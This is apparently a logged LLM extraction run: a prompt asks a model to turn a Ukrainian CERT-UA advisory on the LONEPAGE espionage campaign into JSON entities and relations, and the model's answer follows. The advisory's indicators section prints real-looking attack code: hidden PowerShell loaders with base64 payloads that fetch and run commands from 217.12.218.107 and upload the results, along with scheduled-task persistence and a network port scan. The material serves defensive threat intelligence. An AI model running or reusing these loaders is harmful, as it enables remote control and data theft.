@@ -1,0 +1,253 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is (e.g. "hacking group", "malware family", "software product", "software vendor", "government body", "internet domain", "country", "vulnerability identifier", "security advisory"). Use the same phrase for entities of the same kind. This is your own wording; there is no fixed list.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens (e.g. `attacks`, `uses`, `delivers`, `targets-sector`, `exploits`, `hosts`, `attributed-to`, `affects`, `located-in`, `part-of`, `sends-email-to`).
+   - REUSE a type from the KNOWN RELATION TYPES below whenever it fits. Introduce a new type only when none fits; then also list it in `newRelationTypes` with a one-line definition.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] for relation types you introduced; an empty array is the normal case.
+
+### KNOWN RELATION TYPES ###
+- publishes: An organization or vendor officially releases or issues a security advisory, bulletin, or patch.
+- addresses-vulnerability-in: A security advisory or patch provides fixes for security vulnerabilities affecting a software product.
+- affects: A security vulnerability compromises or impacts a specific software product or component.
+- located-in: An organization, entity, or infrastructure is geographically or administratively based in a country or location.
+- part-of: An entity or component is a constituent sub-part of a larger system, suite, or organization.
+- hosts: An IP address, server, or domain hosts a specific file, malware payload, or service.
+- delivers: An exploit, campaign, or delivery mechanism drops or downloads a payload onto a target system.
+- exploits: A threat actor, malware, or campaign leverages a specific security vulnerability to compromise systems.
+- attacks: A threat actor compromises, targets, or executes unauthorized actions against a system, service, or organization.
+- communicates-with: A malware payload or host establishes network connections to an external IP address or server.
+- uses-malware: A threat actor utilizes or deploys a specific malware tool or family in their operations.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA, починаючи з другої половини 2022 року відстежується активність, що здійснюється у відношенні державних організацій та представників засобів масової інформації (редакторів) України з метою шпигунства.&nbsp;</p><p>Невстановленими особами за допомогою електронної пошти та мессенджерів розповсюджуються файли (.HTA, .EXE, .RAR, .LNK), запуск яких призводить до ураження ЕОМ жертви шкідливою програмою LONEPAGE. Згадана програма являє собою PowerShell-сценарій (зазвичай, у вигляді JavaScript або VBScript файлу), що здійснює завантаження з серверу управління TXT-файлу ("upgrade.txt"), виконання PowerShell-команд, які містяться у файлі, та передачу результатів на сервер за допомогою HTTP POST запиту.</p><p>При цьому, на уражену ЕОМ можуть завантажуватися шкідливі програми "THUMBCHOP" (стілер для Chrome та Opera), "CLOGFLAG" (кейлогер), а також TOR та SSH для створення прихованого сервісу і/або побудови зворотнього з'єднання і, в такий спосіб, створення передумов для інтерактивного несанкціонованого віддаленого доступу до комп'ютера. Під час реагування на інцидент також було виявлено зразки шкідливих програм, розроблених з використанням мови програмування Go, а саме: SEAGLOW та OVERJAM</p><p>Крім того, відомі випадки горизонтального переміщення з ураженої ЕОМ, а саме, сканування локальної обчислювальної мережі, компрометації комп'ютерів привілейованих користувачів та отримання доступу до корпоративних інформаційних систем.</p><p>Протягом 2022 - 2023 років згаданим угрупуванням отримано несанкціонований віддалений доступ до декількох десятків ЕОМ в Україні.</p><p>Мінімізації реалізації описаної загрози може сприяти, серед іншого, обмеження можливості запуску на ЕОМ легітимних компонентів: wscript.exe, cscript.exe, powershell.exe, mshta.exe.</p><p>&nbsp;&nbsp;&nbsp;</p><p><strong>Індикатори кіберзагроз</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">f969edd0027b535b085f4642072e241b&nbsp; &nbsp; 8f2a5eeac887a4a9acb30b25c9d2bf4405c6d0c0207ebd7886e95988c93a8a5a&nbsp; &nbsp; wininit.exe (ThumbChop)
+7581ec90e1995586f0f86f62eb61b305&nbsp; &nbsp; a7317dfa2e5fd9bc944a84cd7fd72d943377b567cd186eeea2af5066b28ff0a9&nbsp; &nbsp; Повiстка-479-3398-37.exe
+9ba6ecad25a0b5666454aa8276235a83&nbsp; &nbsp; bcfb1cf90d507fbbc52217d35d84d3dd3c55bcc3cf825ef35e4b829525544b7c&nbsp; &nbsp; Повiстка-479-3398-37.docx.lnk
+af73d4d0361b66dc54f3c25db6351111&nbsp; &nbsp; 55d8b1951e1ce8b3aea07ee3a3fb9f0e8f0cd345d08096806ddad9a6691510ec&nbsp; &nbsp; wsT62fr.vbs (LonePage)
+286e04a218a6df2b4426f2b986971b36&nbsp; &nbsp; 7255941febd9e2b398e14b4b8b1cbbd7b68908f5c73ecbfafc4c48d68e0e1d6a&nbsp; &nbsp; 192.docx.lnk
+abb9140e98eaf1b2729ace09d77169b6&nbsp; &nbsp; 584d03057a739240eede6384dc3a1537dc1fc896cc9c506ab1a281c195393ae2&nbsp; &nbsp; wsT62fr.vbs
+b6f0d098d757fcc81f77534aebd3cf1b&nbsp; &nbsp; e04ba69e4d4935b30c3325679328b1f12cbf1eb2c5b739d717487d20bd667d12&nbsp; &nbsp; AlexEcoPlanetMainPage.zip
+2077689e5b9eb862add8ef779738c469&nbsp; &nbsp; 3a1437355c222bf4262dfcf76718cf35789fdab7ef424ade0651046435b5ddc5&nbsp; &nbsp; AlexEcoPlanetMainPage.hta
+b1041363732d49fcabc39beeda27717c&nbsp; &nbsp; 75a2b04082b3d0178b98da2ae14265d0169419a76c7c79cc0abd3c451904c61a&nbsp; &nbsp; OneDriveUpdaterCore.vbs (LonePage)
+196d162f19ef28ae5afca4baafa38cfb&nbsp; &nbsp; 4453bf8cd981b35f8defe5c8392d6b23cea730877c047d99e11535b20da0caca&nbsp; &nbsp; AngelsWebSite.hta
+46410bb9e3ed9bf5c228d6da4089866c&nbsp; &nbsp; 3cf76b9dd4ed21168a3c2aaab158a65df4558d4557d47383ecd3a55df64e5c3b&nbsp; &nbsp; OneDriveUpdaterCore.vbs (LonePage)
+663bc28526d059a14a23a6a5945a8f58&nbsp; &nbsp; 083a8a7ceceab777e47a49595e583c7137173b23318914399ad9dbab15a4c29a&nbsp; &nbsp; AngelsWebsite.html (decoy)
+96120f299054be502d01ccdb7c5083a3&nbsp; &nbsp; 36555640516b1ed087638443cbab08a368192995b06284396143e5d83d7cf96c&nbsp; &nbsp; WindowsUpdateServices.exe (ClogFlag)
+b454fe65b817f88042f00de97528530b&nbsp; &nbsp; f0bdcb507aaf9af91bc69511a4873462e9b2b07c173c71d9c4c622a2754f5d5b&nbsp; &nbsp; TaskManager.exe
+a848e813ffc0040c9392c213eb8f6102&nbsp; &nbsp; 786f4b1a64160077d771702b5da2e559425591b2f9a3fcf9d6de76858151c773&nbsp; &nbsp; tm76Grt9.vbs (LonePage)
+3330e620101b6ecbfa7c121b9ed2590e&nbsp; &nbsp; 907bccf7ce8e744680364e3e137365ce4d8ebe9d19c2c3e2342794747c5dd292&nbsp; &nbsp; taskhost.exe (SeaGlow)
+b96418ef58218d762836fcb17d14ea4d&nbsp; &nbsp; b9b5f81d36e8e514ffccf9b85c0c61e76322a279a7f5a67821b5396b9beaff3a&nbsp; &nbsp; WindowsUpdateServices.exe (ClogFlag)
+179baa523f8ad63b492bacc8acabaf04&nbsp; &nbsp; fb1312e70cd1766928550985782eb7b89d78cc93cfc66bafaa12287db2f8cf56&nbsp; &nbsp; SearchApp.exe (SeaGlow)
+ed0a9320189bdeb340c9afbf02e0e2d3&nbsp; &nbsp; 03e10e3dd7d8ba535c54cd4e38bc9815938df0460120fa1d6d7614d05a1e824f&nbsp; &nbsp; GO_ReverseProxy.exe (OverJam)
+11bc275d9dc476829c1a36ee89506db5&nbsp; &nbsp; 77c1e74a2b0bca42bf30ed539663e6b5db2aa18dcdea55fd92eb6273ef1362a5&nbsp; &nbsp; TaskManager.exe (LonePage)
+a255c0f591c9a4ddddfb700d8937288d&nbsp; &nbsp; ec87ed83f6b1b5cbd40355a5e5b12a0fa9232f1264243998c0f4ae9f1ab03faa&nbsp; &nbsp; DriverUpdate.js (LonePage)
+b8014ca4b86015ceb6024d39c72f33ea&nbsp; &nbsp; 51cd4682f6152f0a9f915c6bb75991cbf0140da8e39f903a931f39a1b19fd542&nbsp; &nbsp; FileExplorerCoreTaskMachine.exe (LonePage)
+a74244d531c0a11259b5b4cd9bcc7a7e&nbsp; &nbsp; 00b7e464b190dc3ee8847e214857b83180f948b5c887466f09bb91a3352b889a&nbsp; &nbsp; tmpYh48.vbs (LonePage)
+e70218a98dc74d5d7cda2f6a756e1f25&nbsp; &nbsp; 0c0b3025dcd6d5bb96c83305cfa26795b4ec956ba62661f8e67b477542268229&nbsp; &nbsp; svchost.exe (ClogFlag)
+d565d3d36651d3be3cd3e8df9e0bd6c2&nbsp; &nbsp; 89b0868fccc4e64a710c0a85a84e23f4788b7474c8ce847a1fef9f1616dd69fa&nbsp; &nbsp; svchost.exe
+</pre><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">%APPDATA%\Microsoft\Installer\taskhost.exe
+%APPDATA%\Microsoft\Windows\start menu\programs\startup\WindowsUpdateServices.lnk
+%LOCALAPPDATA%\Google\Chrome\User Data\NetworkService\Local State.txt
+%LOCALAPPDATA%\OneDriveFiles\OneDriveUpdaterCore.vbs
+%LOCALAPPDATA%\UpdateFiles\temp.bin
+%USERPROFILE%\.ssh\
+%USERPROFILE%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_64.db
+%USERPROFILE%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_windows.js
+%USERPROFILE%\AppData\Local\Microsoft\Windows\Shell\svchost.exe
+%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Templates\ZillyaCore.exe
+%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Templates\svchost.exe
+%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Themes\WindowsUpdateServices.exe
+%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Themes\slideshow.bat
+%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Themes\slideshow.exe
+%USERPROFILE%\appdata\local\temp\TaskManager.exe
+%USERPROFILE%\appdata\local\temp\audiocompress.js
+%USERPROFILE%\appdata\local\temp\update.js
+%USERPROFILE%\appdata\local\temp\wininit.exe
+%USERPROFILE%\downloads\AlexEcoPlanet.html
+%USERPROFILE%\downloads\AngelsWebsite.html
+%LOCALAPPDATA%\Microsoft\WindowsApps\SearchApp.exe
+C:\Microsoft\Windows\start menu\programs\startup\WindowsUpdateServices.lnk
+C:\Windows\System32\Tasks\OneDriveUpdateCoreFilesStart
+%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -nop -noni -exec bypass -c $temp='UEsDBBQABg[...]AABNMgAAAAA=';$fil=[System.Convert]::FromBase64String($temp);set-content $home\appdata\local\temp\479-3398-37.docx -value $fil -encoding byte;&amp;$home\appdata\local\temp\479-3398-37.docx;$a='ZGltIHIsIGMNCnNldCByID0gY3JlYXRlb2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCmMgPSAicG93ZXJzaGVsbC5leGUgLWV4ZWN1dGlvbnBvbGljeSBieXBhc3MgLXcgaGlkZGVuIC1ub3Byb2ZpbGUgLWMgJGlpaz1uZXctb2JqZWN0IG5ldC53ZWJjbGllbnQ7JGZsbT0kaWlrLmRvd25sb2FkZGF0YSgnaHR0cDovLzIxNy4xMi4yMTguMTA3OjMwMTM5L2FNUG5HcWpSUFNRSU9aUUcvcGFnZTE0Ny91cGdyYWRlLnR4dCcpO2lmKCRmbG0uTGVuZ3RoIC1ndCAxKXskamtyPVtzeXN0ZW0udGV4dC5lbmNvZGluZ106OnV0ZjguZ2V0U3RyaW5nKCRmbG0pO2lmKCRqa3IgLW1hdGNoICdnZXQtY29udGVudCcpe1tieXRlW11dICRkcnB5PUlFWCAkamtyO31lbHNleyRiamRvPXdob2FtaTskYmpkbys9Jz09JzskYmpkbys9W1N5c3RlbS5OZXQuRG5zXTo6R2V0SG9zdEFkZHJlc3NlcygkaXApK1tTeXN0ZW0uRW52aXJvbm1lbnRdOjpOZXdMaW5lOyRiamRvKz1JRVggJGprcnxvdXQtc3RyaW5nO1tieXRlW11dJGRycHk9W3N5c3RlbS50ZXh0LmVuY29kaW5nXTo6VXRmOC5HZXRCeXRlcygkYmpkbyk7fTskdWprPW5ldy1vYmplY3QgbmV0LndlYmNsaWVudDskdWprLnVwbG9hZGRhdGEoJ2h0dHA6Ly8yMTcuMTIuMjE4LjEwNzoyNTkyOC9wYWdlMTQ3JywkZHJweSk7fSINCnIuUnVuIGMsIDAsIGZhbHNl';$b=[System.Convert]::FromBase64String($a);$c=[System.Text.Encoding]::utf8.GetString($b);set-content $home\appdata\local\temp\wsT62fr.vbs -value $c;schtasks.exe /create /TN FileExplorerUpdateTaskMachineCore /SC minute /mo 12 /tr $home\appdata\local\temp\wsT62fr.vbs /f;
+attrib.exe +h $home\.ssh
+attrib.exe +h C:\programdata\ssh
+mkdir $home\.ssh
+mkdir C:\ProgramData\ssh
+foreach ($ip 50..255){foreach($port in 21,22,23,139,443,80,445,626) {Test-NetConnection 192.168.88.$ip -Port $port &gt;&gt; $home\appdata\local\temp\wserv.log}}
+net.webclient;$flm=$iik.downloaddata('http://217.12.218.107:30139/aMPnGqjRPSQIOZQG/page147/upgrade.txt');if($flm.Length -gt 1){$jkr=[system.text.encoding]::utf8.getString($flm);if($jkr -match 'get-content'){[byte[]] $drpy=IEX $jkr;}else{$bjdo=whoami;$bjdo+='==';$bjdo+=[System.Net.Dns]::GetHostAddresses($ip)+[System.Environment]::NewLine;$bjdo+=IEX $jkr|out-string;[byte[]]$drpy=[system.text.encoding]::Utf8.GetBytes($bjdo);};$ujk=new-object net.webclient;$ujk.uploaddata('http://217.12.218.107:25928/page147',$drpy);}
+powershell.exe -w hidden -nop -noni -exec bypass -c kill -name mshta;$a='ZGltIHIsIGMNCnNldCByID0gY3JlYXRlb2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCmMgPSAicG93ZXJzaGVsbC5leGUgLWV4ZWN1dGlvbnBvbGljeSBieXBhc3MgLXcgaGlkZGVuIC1ub3Byb2ZpbGUgLWMgJGlpaz1uZXctb2JqZWN0IG5ldC53ZWJjbGllbnQ7JGZsbT0kaWlrLmRvd25sb2FkZGF0YSgnaHR0cDovLzIxNy4xMi4yMTguMTA3OjMwMTM5L09qeExzSFBEWlFBdm5iakcvcGFnZTk0L3VwZ3JhZGUudHh0Jyk7aWYoJGZsbS5MZW5ndGggLWd0IDEpeyRqa3I9W3N5c3RlbS50ZXh0LmVuY29kaW5nXTo6dXRmOC5nZXRTdHJpbmcoJGZsbSk7aWYoJGprciAtbWF0Y2ggJ2dldC1jb250ZW50Jyl7W2J5dGVbXV0gJGRycHk9SUVYICRqa3I7fWVsc2V7JGJqZG89d2hvYW1pOyRiamRvKz0nPT0nOyRiamRvKz1bU3lzdGVtLk5ldC5EbnNdOjpHZXRIb3N0QWRkcmVzc2VzKCRpcCkrW1N5c3RlbS5FbnZpcm9ubWVudF06Ok5ld0xpbmU7JGJqZG8rPUlFWCAkamtyfG91dC1zdHJpbmc7W2J5dGVbXV0kZHJweT1bc3lzdGVtLnRleHQuZW5jb2RpbmddOjpVdGY4LkdldEJ5dGVzKCRiamRvKTt9OyR1ams9bmV3LW9iamVjdCBuZXQud2ViY2xpZW50OyR1amsudXBsb2FkZGF0YSgnaHR0cDovLzIxNy4xMi4yMTguMTA3OjI1OTI4L3BhZ2U5NCcsJGRycHkpO30iDQpyLlJ1biBjLCAwLCBmYWxzZQ0K';$b=[System.Convert]::FromBase64String($a);$c=[System.Text.Encoding]::utf8.GetString($b); New-Item -Path $home\appdata\local\OneDriveFiles -ItemType Directory;set-content $home\appdata\local\OneDriveFiles\OneDriveUpdaterCore.vbs -value $c;schtasks.exe /create /TN OneDriveUpdateCoreFilesStart /SC minute /mo 15 /tr $home\appdata\local\OneDriveFiles\OneDriveUpdaterCore.vbs /f;
+powershell.exe -w hidden -nop -noni -exec bypass -c;$a='//48ACEAR[...]BtAGwAPgA=';$b=[System.Convert]::FromBase64String($a);[IO.File]::WriteAllBytes($home+'\downloads\AngelsWebsite.html',$b);; Start-Process $home\downloads\AngelsWebsite.html;
+powershell.exe -w hidden -nop -noni -exec bypass -c;$a='//4gADwAI[...]BtAGwAPgA=';$b=[System.Convert]::FromBase64String($a);[IO.File]::WriteAllBytes($home+'\downloads\AlexEcoPlanet.html',$b);; Start-Process $home\downloads\AlexEcoPlanet.html;"
+schtasks.exe /create /TN BatIncludeMessage /SC minute /mo 3 /tr $home\AppData\Local\temp\tm76Grt9.vbs /f
+schtasks.exe /create /TN OneDriveUpdateCoreFilesStart /SC minute /mo 15 /tr %LOCALAPPDATA%\OneDriveFiles\OneDriveUpdaterCore.vbs /f;
+schtasks.exe /create /TN ThemesSlide /SC minute /mo 27 /tr $home\AppData\Roaming\Microsoft\Windows\Themes\slideshow.bat /f
+schtasks.exe /create /tn OneDriveStandal0ne /tr C:\Users\Public\Libraries\OneDriveUpdate.js /sc minute /mo 3 /f
+start-process "C:\Users\user\appdata\Local\Microsoft\WindowsApps\SearchApp.exe" -ArgumentList "-s 62.210.204.94"
+BatIncludeMessage (Scheduled Task)
+OneDriveUpdateCoreFilesStart (Scheduled Task)
+ThemesSlide (Scheduled Task)
+OneDriveStandal0ne (Scheduled Task)
+C:\Users\user\Desktop\KeyLog_with_date\KL\KL\obj\Release\WindowsUpdateServices.pdb (PDB)
+C:\Users\user\Desktop\svchost\svchost\obj\Release\svchost.pdb (PDB)
+C:\Users\user\Documents\Visual Studio 2012\Projects\OneDriveUpdateCore\OneDriveUpdateCore\obj\Release\OneDriveUpdateCore.pdb
+C:\Users\user\Documents\Visual Studio 2012\Projects\WindowsNotificationsServ\WindowsNotificationsServ\obj\Release\WindowsNotificationsServ.pdb
+</pre><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">156[.]38.245.115
+179[.]48.251.182
+217[.]12.218.107
+45[.]148.121.6
+62[.]210.204.94
+hXXp://156[.]38.245.115/oHYgdtRwKJ/page69/upgrade[.]txt
+hXXp://156[.]38.245.115:38104/page69
+hXXp://217[.]12.218.107:25928/page121
+hXXp://217[.]12.218.107:25928/page147
+hXXp://217[.]12.218.107:30139/aMPnGqjRPSQIOZQG/page147/upgrade[.]txt
+hXXp://45[.]148.121.6:32341/slideshow[.]bat
+hXXp://45[.]148.121.6:32341/slideshow[.]php
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p></p><p>Рис.1 Ланцюг ураження LonePage (HTA)</p><p></p><p>Рис.2 Ланцюг ураження LonePage (LNK)</p><p></p><p>Рис.3 Ланцюг ураження LonePage (EXE)</p><p></p><p>Рис.4 Приклад вихідного коду шкідливих програм ThumbChop та ClopFlag</p><p></p><p>Рис.5 Приклад вихідного коду шкідливої програми OverJam</p>
+
+=== RESPONSE (6.6s, in 7926 / out 1209 tok, STOP) ===
+The report details cyberespionage activities targeting Ukrainian government organizations and media representatives using LONEPAGE malware to deploy additional payloads like THUMBCHOP, CLOGFLAG, SEAGLOW, and OVERJAM.
+
+```json
+{
+  "entities": [
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A sovereign country in Eastern Europe."
+    },
+    {
+      "name": "LONEPAGE",
+      "kind": "malware family",
+      "gloss": "A PowerShell-based downloader malware family designed to fetch secondary payloads and execute commands."
+    },
+    {
+      "name": "THUMBCHOP",
+      "kind": "malware family",
+      "gloss": "An information stealer malware targeting web browser credentials and session data from Chrome and Opera."
+    },
+    {
+      "name": "CLOGFLAG",
+      "kind": "malware family",
+      "gloss": "A keylogger malware family designed to capture keystrokes on infected systems."
+    },
+    {
+      "name": "SEAGLOW",
+      "kind": "malware family",
+      "gloss": "A malware family written in Go used to establish persistent control and remote access."
+    },
+    {
+      "name": "OVERJAM",
+      "kind": "malware family",
+      "gloss": "A reverse proxy utility and malware family written in the Go programming language."
+    },
+    {
+      "name": "Chrome",
+      "kind": "software product",
+      "gloss": "A cross-platform web browser developed by Google."
+    },
+    {
+      "name": "Opera",
+      "kind": "software product",
+      "gloss": "A multi-platform web browser developed by Opera Software."
+    },
+    {
+      "name": "TOR",
+      "kind": "software product",
+      "gloss": "Open-source software enabling anonymous communication and hidden network services."
+    },
+    {
+      "name": "SSH",
+      "kind": "software product",
+      "gloss": "A cryptographic network protocol for operating network services securely over an unsecured network."
+    },
+    {
+      "name": "156.38.245.115",
+      "kind": "ip address",
+      "gloss": "An IP address associated with command and control and file delivery infrastructure."
+    },
+    {
+      "name": "179.48.251.182",
+      "kind": "ip address",
+      "gloss": "An IP address identified as part of the malicious campaign infrastructure."
+    },
+    {
+      "name": "217.12.218.107",
+      "kind": "ip address",
+      "gloss": "An IP address used to host command payloads and receive exfiltrated data."
+    },
+    {
+      "name": "45.148.121.6",
+      "kind": "ip address",
+      "gloss": "An IP address identified as network infrastructure used to deliver scripts."
+    },
+    {
+      "name": "62.210.204.94",
+      "kind": "ip address",
+      "gloss": "An IP address used as a network connection endpoint by SEAGLOW malware."
+    }
+  ],
+  "relations": [
+    {
+      "head": "LONEPAGE",
+      "type": "delivers",
+      "tail": "THUMBCHOP",
+      "evidence": "на уражену ЕОМ можуть завантажуватися шкідливі програми \"THUMBCHOP\""
+    },
+    {
+      "head": "LONEPAGE",
+      "type": "delivers",
+      "tail": "CLOGFLAG",
+      "evidence": "на уражену ЕОМ можуть завантажуватися шкідливі програми \"THUMBCHOP\" (стілер для Chrome та Opera), \"CLOGFLAG\""
+    },
+    {
+      "head": "THUMBCHOP",
+      "type": "affects",
+      "tail": "Chrome",
+      "evidence": "\"THUMBCHOP\" (стілер для Chrome"
+    },
+    {
+      "head": "THUMBCHOP",
+      "type": "affects",
+      "tail": "Opera",
+      "evidence": "\"THUMBCHOP\" (стілер для Chrome та Opera)"
+    },
+    {
+      "head": "LONEPAGE",
+      "type": "communicates-with",
+      "tail": "217.12.218.107",
+      "evidence": "ujk.uploaddata('http://217.12.218.107:25928/page147'"
+    },
+    {
+      "head": "SEAGLOW",
+      "type": "communicates-with",
+      "tail": "62.210.204.94",
+      "evidence": "SearchApp.exe\" -ArgumentList \"-s 62.210.204.94\""
+    }
+  ],
+  "newRelationTypes": []
+}
+```
